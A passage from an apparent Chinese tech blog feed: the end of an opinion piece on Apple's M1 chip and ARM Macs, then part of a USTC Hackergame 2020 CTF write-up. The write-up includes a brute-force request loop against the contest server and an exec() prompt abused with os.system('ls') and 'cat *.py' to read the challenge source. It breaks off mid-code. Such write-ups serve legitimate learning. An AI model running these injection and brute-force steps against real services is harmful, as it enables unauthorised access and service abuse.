Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> 